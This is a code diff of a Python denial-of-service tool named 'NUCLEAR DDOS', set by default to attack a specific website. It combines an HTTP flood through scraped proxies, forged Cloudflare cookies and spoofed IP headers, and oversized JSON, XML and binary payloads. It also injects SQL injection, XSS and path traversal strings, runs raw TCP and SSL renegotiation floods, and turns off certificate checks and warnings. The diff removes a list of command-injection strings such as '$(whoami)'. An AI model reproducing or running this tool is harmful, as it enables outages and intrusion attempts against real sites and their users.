@@ -20,6 +20,12 @@ from datetime import datetime
 import queue
 import subprocess
 import re
+import warnings
+
+# ==================== DISABLE ALL WARNINGS ====================
+warnings.filterwarnings('ignore')
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ==================== COLORS ====================
 class Colors:
@@ -36,7 +42,7 @@ class Colors:
 
 # ==================== CONFIG ====================
 TARGET = os.environ.get('TARGET', 'https://skillclash.site')
-THREADS = int(os.environ.get('THREADS', 2000))  # Increased
+THREADS = int(os.environ.get('THREADS', 2000))
 PROXY_PORT = 8872
 PROXY_FILE = 'proxies.txt'
 
@@ -49,34 +55,24 @@ stats = {
     'errors': 0,
     'proxies_used': 0,
     'bypassed': 0,
-    'cloudflare_bypass': 0,
-    'connection_reset': 0
+    'cloudflare_bypass': 0
 }
 stats_lock = threading.Lock()
 running = True
 
 # ==================== CLOUDFLARE BYPASS ====================
 def get_cloudflare_cookies():
-    """Generate Cloudflare bypass cookies"""
     cookies = {}
-    
-    # __cfduid cookie
     cfduid = hashlib.md5(f"{random.randint(100000,999999)}-{time.time()}".encode()).hexdigest()
     cookies['__cfduid'] = cfduid
-    
-    # cf_clearance cookie
     clearance = base64.b64encode(f"{random.randint(100000,999999)}-{time.time()}".encode()).decode()
     cookies['cf_clearance'] = clearance
-    
-    # __cf_bm cookie
     bm = hashlib.sha256(f"{random.randint(100000,999999)}-{time.time()}".encode()).hexdigest()
     cookies['__cf_bm'] = bm
-    
     return cookies
 
 # ==================== PROXY FETCHER ====================
 def fetch_proxies():
-    """Fetch proxies from multiple sources"""
     sources = [
         'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all',
         'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/main/socks5.txt',
@@ -85,9 +81,7 @@ def fetch_proxies():
         'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
         'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/main/http.txt',
         'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
-        'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt',
-        'https://raw.githubusercontent.com/zevtyardt/proxy-list/main/proxy-list.txt',
-        'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt'
+        'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt'
     ]
     all_proxies = []
     for url in sources:
@@ -116,13 +110,12 @@ def fetch_proxies():
     for p in all_proxies[:1000]:
         try:
             proxies = {'http': p, 'https': p.replace('http://', 'https://')}
-            r = requests.get(test_url, proxies=proxies, timeout=2)
+            r = requests.get(test_url, proxies=proxies, timeout=2, verify=False)
             if r.status_code == 200:
                 valid.append(p)
         except:
             pass
     
-    # Save all proxies (even if not validated)
     with open(PROXY_FILE, 'w') as f:
         f.write('\n'.join(all_proxies))
     
@@ -198,9 +191,6 @@ def start_proxy_server():
 
 # ==================== NUCLEAR PAYLOADS ====================
 def generate_nuclear_payload():
-    """Generate payloads that actually work"""
-    
-    # 1. Massive JSON with nested structures
     if random.random() > 0.7:
         return {
             'type': 'json',
@@ -214,20 +204,15 @@ def generate_nuclear_payload():
                     'array': [{'id': i, 'value': 'X'*random.randint(100,500)} for i in range(random.randint(50,200))]
                 },
                 'payload': base64.b64encode(b'A'*random.randint(5000,20000)).decode(),
-                '_method': 'PUT',
-                '__cfduid': hashlib.md5(str(random.random()).encode()).hexdigest()
+                '_method': 'PUT'
             }
         }
-    
-    # 2. XML with entity expansion
     if random.random() > 0.6:
         entities = ''.join([f'<!ENTITY e{i} SYSTEM "file:///dev/urandom">' for i in range(random.randint(10,50))])
         return {
             'type': 'xml',
             'data': f'<?xml version="1.0"?><!DOCTYPE root [{entities}]><root><id>{random.randint(1,999999)}</id><data><![CDATA[{"X"*random.randint(5000,20000)}]]></data></root>'
         }
-    
-    # 3. Form data with huge values
     if random.random() > 0.5:
         form_data = {}
         for i in range(random.randint(50,200)):
@@ -236,28 +221,23 @@ def generate_nuclear_payload():
             'type': 'form',
             'data': form_data
         }
-    
-    # 4. Binary data
     return {
         'type': 'binary',
         'data': bytes([random.randint(0,255) for _ in range(random.randint(5000,50000))])
     }
 
 def generate_nuclear_headers():
-    """Headers that bypass all protections"""
     headers = {
         'User-Agent': random.choice([
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/124.0',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-            'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0'
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Version/17.0 Mobile/15E148 Safari/604.1'
         ]),
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.9,fr;q=0.8', 'en-US,en;q=0.9,de;q=0.8']),
-        'Accept-Encoding': 'gzip, deflate, br, zstd',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.9,fr;q=0.8']),
+        'Accept-Encoding': 'gzip, deflate, br',
         'Cache-Control': 'no-cache, no-store, must-revalidate',
         'Pragma': 'no-cache',
         'Connection': 'keep-alive',
@@ -266,11 +246,10 @@ def generate_nuclear_headers():
         'Sec-Fetch-Mode': 'navigate',
         'Sec-Fetch-Site': 'none',
         'Sec-Fetch-User': '?1',
-        'DNT': '1',
-        'Priority': 'u=0, i'
+        'DNT': '1'
     }
     
-    # IP spoofing headers
+    # IP spoofing
     ips = [f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}' for _ in range(5)]
     headers['X-Forwarded-For'] = ', '.join(ips)
     headers['X-Real-IP'] = ips[0]
@@ -278,10 +257,6 @@ def generate_nuclear_headers():
     headers['CF-Connecting-IP'] = ips[2]
     headers['True-Client-IP'] = ips[3]
     headers['X-Client-IP'] = ips[4]
-    
-    # Add Cloudflare bypass headers
-    headers['CF-Worker'] = random.choice(['true', '1'])
-    headers['CF-Access-Client-Id'] = hashlib.md5(str(random.random()).encode()).hexdigest()
     
     # Random custom headers
     for _ in range(random.randint(5, 15)):
@@ -292,38 +267,16 @@ def generate_nuclear_headers():
     return headers
 
 def generate_nuclear_path():
-    """Generate paths with multiple bypass techniques"""
-    
     paths = [
-        '/api/v1/data',
-        '/wp-admin/admin-ajax.php',
-        '/index.php',
-        '/login',
-        '/search',
-        '/products',
-        '/cart',
-        '/checkout',
-        '/graphql',
-        '/api/graphql',
-        '/v1/api',
-        '/rest/v1',
-        '/admin',
-        '/cgi-bin',
-        '/.env',
-        '/backup',
-        '/config',
-        '/.git/config',
-        '/wp-json',
-        '/api/rest',
-        '/oauth',
-        '/auth',
-        '/register',
-        '/reset-password'
+        '/api/v1/data', '/wp-admin/admin-ajax.php', '/index.php', '/login',
+        '/search', '/products', '/cart', '/checkout', '/graphql',
+        '/api/graphql', '/v1/api', '/rest/v1', '/admin', '/cgi-bin',
+        '/.env', '/backup', '/config', '/.git/config', '/wp-json',
+        '/api/rest', '/oauth', '/auth', '/register', '/reset-password'
     ]
     
     path = random.choice(paths)
     
-    # Add multiple bypass parameters
     params = {
         'id': random.randint(1,999999),
         'page': random.randint(1,1000),
@@ -343,45 +296,30 @@ def generate_nuclear_path():
         'nocache': str(int(time.time()))
     }
     
-    # Add SQL injection variants
+    # SQL injection
     if random.random() > 0.4:
         sql_payloads = [
             f"{random.randint(1,100)}' OR '1'='1",
             f"{random.randint(1,100)}' UNION SELECT {','.join([str(random.randint(1,100)) for _ in range(random.randint(1,5))])}--",
             f"{random.randint(1,100)}' AND 1=1--",
             f"{random.randint(1,100)}' OR 1=1--",
-            f"{random.randint(1,100)}' OR 'x'='x",
-            f"{random.randint(1,100)}'/**/OR/**/1=1--"
+            f"{random.randint(1,100)}' OR 'x'='x"
         ]
         params['sql'] = random.choice(sql_payloads)
     
-    # Add XSS variants
+    # XSS
     if random.random() > 0.5:
         xss_payloads = [
             f"<script>alert('{random.randint(1,100)}')</script>",
             f'<img src=x onerror=alert({random.randint(1,100)})>',
-            f'"><script>alert({random.randint(1,100)})</script>',
-            f'javascript:alert({random.randint(1,100)})',
-            f'<svg onload=alert({random.randint(1,100)})>'
+            f'"><script>alert({random.randint(1,100)})</script>'
         ]
         params['xss'] = random.choice(xss_payloads)
     
-    # Add path traversal
+    # Path traversal
     if random.random() > 0.6:
         traversal = '../' * random.randint(1,10) + random.choice(['etc/passwd', 'config.php', '.env', 'wp-config.php'])
         params['file'] = traversal
-        params['path'] = traversal
-    
-    # Add command injection
-    if random.random() > 0.8:
-        cmd_payloads = [
-            '; ls -la',
-            '&& whoami',
-            '| id',
-            '`id`',
-            '$(whoami)'
-        ]
-        params['cmd'] = random.choice(cmd_payloads)
     
     return path + '?' + urlencode(params)
 
@@ -399,7 +337,6 @@ def display_stats():
     last_requests = 0
     last_time = start_time
     last_success = 0
-    success_history = []
     
     while running:
         time.sleep(1)
@@ -421,16 +358,10 @@ def display_stats():
         last_success = succ
         last_time = current_time
         
-        # Store success rate history
-        success_history.append(success_rate)
-        if len(success_history) > 10:
-            success_history.pop(0)
-        avg_success = sum(success_history) / len(success_history) if success_history else 0
-        
         sys.stdout.write('\033[2J\033[H')
         
         print(f"{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
-        print(f"{Colors.RED}{Colors.BOLD}║                 💀 NUCLEAR BYPASS ATTACK - ACTIVE 💀                   ║{Colors.RESET}")
+        print(f"{Colors.RED}{Colors.BOLD}║                 💀 NUCLEAR BYPASS - ATTACK ACTIVE 💀                   ║{Colors.RESET}")
         print(f"{Colors.RED}{Colors.BOLD}╚═══════════════════════════════════════════════════════════════════════╝{Colors.RESET}")
         print()
         print(f"{Colors.CYAN}🎯 Target:{Colors.RESET} {TARGET}")
@@ -449,7 +380,6 @@ def display_stats():
         print(f"  {Colors.CYAN}🌐 Proxies:{Colors.RESET} {proxies:,}")
         print()
         
-        # Progress bar
         total = req + err
         if total > 0:
             overall_success = (succ / total) * 100 if total > 0 else 0
@@ -474,7 +404,6 @@ def display_stats():
             print(f"  {color}{status}{Colors.RESET}")
         print()
         
-        # Speed indicators
         if rps > 5000:
             print(f"{Colors.GREEN}🚀 EXTREME SPEED! {Colors.RESET}")
         elif rps > 2000:
@@ -487,10 +416,13 @@ def display_stats():
 def nuclear_worker(worker_id):
     global running
     
-    # Create session
+    # Create session with NO WARNINGS
     sess = requests.Session()
     sess.keep_alive = False
-    sess.verify = False
+    sess.verify = False  # Disable SSL verification
+    
+    # Suppress warnings for this session
+    requests.packages.urllib3.disable_warnings()
     
     # Custom adapter
     adapter = HTTPAdapter(
@@ -561,7 +493,6 @@ def nuclear_worker(worker_id):
                     if r.status_code < 300:
                         stats['bypassed'] += 1
                         local_bypass += 1
-                        # Check if Cloudflare bypassed
                         if 'cf-' in str(r.headers).lower():
                             stats['cloudflare_bypass'] += 1
                 else:
@@ -572,11 +503,9 @@ def nuclear_worker(worker_id):
             if r.status_code < 400:
                 time.sleep(random.uniform(0.0001, 0.0005))
             else:
-                # On block, switch proxy and increase attack
                 sess.proxies = {}
                 time.sleep(random.uniform(0.0005, 0.002))
                 
-                # Send extra request on block
                 try:
                     sess.post(url, headers=headers, json={'force': 'A'*10000}, timeout=1)
                 except:
@@ -590,11 +519,6 @@ def nuclear_worker(worker_id):
                 except:
                     pass
                     
-        except requests.exceptions.ConnectionError:
-            with stats_lock:
-                stats['connection_reset'] += 1
-                stats['errors'] += 1
-            time.sleep(0.01)
         except:
             with stats_lock:
                 stats['errors'] += 1
@@ -603,7 +527,6 @@ def nuclear_worker(worker_id):
 
 # ==================== TCP FLOOD ====================
 def tcp_flood_worker():
-    """Raw TCP flood with custom packets"""
     global running
     target_host = TARGET.replace('https://', '').replace('http://', '').split('/')[0]
     port = 443 if 'https://' in TARGET else 80
@@ -614,7 +537,6 @@ def tcp_flood_worker():
             sock.settimeout(1)
             sock.connect((target_host, port))
             
-            # Send multiple requests on same connection
             for _ in range(random.randint(5, 20)):
                 path = generate_nuclear_path()
                 request = f"GET {path} HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: {random.choice(['Chrome', 'Firefox'])}\r\nConnection: keep-alive\r\n\r\n"
@@ -630,18 +552,19 @@ def tcp_flood_worker():
 
 # ==================== SSL RENEGOTIATION ====================
 def ssl_reneg_worker():
-    """SSL renegotiation attack"""
     global running
     target_host = TARGET.replace('https://', '').replace('http://', '').split('/')[0]
     
     while running:
         try:
             context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE  # Disable SSL verification
+            
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((target_host, 443))
             ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
             
-            # Force renegotiation
             for _ in range(random.randint(5, 10)):
                 try:
                     ssl_sock.do_handshake()
@@ -657,8 +580,12 @@ def ssl_reneg_worker():
 
 # ==================== MAIN ====================
 if __name__ == '__main__':
+    # Suppress all warnings globally
+    warnings.filterwarnings('ignore')
+    os.environ['PYTHONWARNINGS'] = 'ignore'
+    
     print(f"{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
-    print(f"{Colors.RED}{Colors.BOLD}║           💀 NUCLEAR DDOS - DEVILS WILL RISE ULTIMATE 💀              ║{Colors.RESET}")
+    print(f"{Colors.RED}{Colors.BOLD}║           💀 NUCLEAR DDOS - NO WARNINGS - ULTIMATE 💀                ║{Colors.RESET}")
     print(f"{Colors.RED}{Colors.BOLD}╚═══════════════════════════════════════════════════════════════════════╝{Colors.RESET}")
     print()
     print(f"{Colors.CYAN}🎯 Target:{Colors.RESET} {TARGET}")
@@ -677,17 +604,14 @@ if __name__ == '__main__':
     # Launch attacks
     print(f"{Colors.GREEN}🚀 Launching nuclear attacks...{Colors.RESET}")
     
-    # HTTP flood - 50%
     http_threads = int(THREADS * 0.5)
     for i in range(http_threads):
         threading.Thread(target=nuclear_worker, args=(i,), daemon=True).start()
     
-    # TCP flood - 30%
     tcp_threads = int(THREADS * 0.3)
     for _ in range(tcp_threads):
         threading.Thread(target=tcp_flood_worker, daemon=True).start()
     
-    # SSL renegotiation - 20%
     ssl_threads = int(THREADS * 0.2)
     for _ in range(ssl_threads):
         threading.Thread(target=ssl_reneg_worker, daemon=True).start()
@@ -697,7 +621,6 @@ if __name__ == '__main__':
     print(f"{Colors.RED}{Colors.BOLD}🔥 NUCLEAR ATTACK STARTED! PRESS CTRL+C TO STOP{Colors.RESET}")
     print()
     
-    # Start display
     try:
         display_stats()
     except KeyboardInterrupt:
